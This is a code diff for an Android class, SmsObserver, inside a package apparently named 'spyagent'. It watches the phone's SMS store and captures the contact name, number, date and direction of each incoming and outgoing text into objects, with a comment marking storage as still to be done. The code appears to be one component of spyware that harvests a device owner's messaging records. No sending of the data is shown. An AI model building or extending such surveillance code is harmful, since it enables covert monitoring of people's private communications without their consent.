@@ -10,6 +10,8 @@ import android.provider.ContactsContract;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
+import com.irodyk.spyagent.control.domain.Sms;
+
 /**
  * Created by i.rodyk on 8/30/16.
  */
@@ -71,20 +73,22 @@ public class SmsObserver extends ContentObserver {
 
                 int type = Integer.parseInt(cursor.getString(cursor.getColumnIndex("type")));
 
+                Sms sms = new Sms();
+
                 if(type == TYPE_RECEIVED){
-                    // handle the received sms
-                    Log.e("Info","Body RECEIVED: " + cursor.getString(cursor.getColumnIndex(BODY)));
-                    Log.e("Info","PERSON RECEIVED: " + SmsUtils.getContactName(mContext, cursor.getString(cursor.getColumnIndex(ADDRESS))));
-                    Log.e("Info","ADDRESS RECEIVED: " + cursor.getString(cursor.getColumnIndex(ADDRESS)));
-                    Log.e("Info","DATE RECEIVED: " + cursor.getString(cursor.getColumnIndex(DATE)));
+                    sms.setType(TYPE_RECEIVED);
+                    sms.setName(SmsUtils.getContactName(mContext, cursor.getString(cursor.getColumnIndex(ADDRESS))));
+                    sms.setNumber(cursor.getString(cursor.getColumnIndex(ADDRESS)));
+                    sms.setDate(SmsUtils.convertTime(cursor.getString(cursor.getColumnIndex(DATE))));
                 }
                 else if (type == TYPE_SENT){
-                    // handle the sent sms
-                    Log.e("Info","Body SENT: " + cursor.getString(cursor.getColumnIndex(BODY)));
-                    Log.e("Info","PERSON SENT: " + SmsUtils.getContactName(mContext, cursor.getString(cursor.getColumnIndex(ADDRESS))));
-                    Log.e("Info","ADDRESS SENT: " + cursor.getString(cursor.getColumnIndex(ADDRESS)));
-                    Log.e("Info","DATE SENT: " + cursor.getString(cursor.getColumnIndex(DATE)));
+                    sms.setType(TYPE_SENT);
+                    sms.setName(SmsUtils.getContactName(mContext, cursor.getString(cursor.getColumnIndex(ADDRESS))));
+                    sms.setNumber(cursor.getString(cursor.getColumnIndex(ADDRESS)));
+                    sms.setDate(SmsUtils.convertTime(cursor.getString(cursor.getColumnIndex(DATE))));
                 }
+
+                //TODO STORE THE SMS
             }
         } finally {
             if(cursor != null && !cursor.isClosed()) {
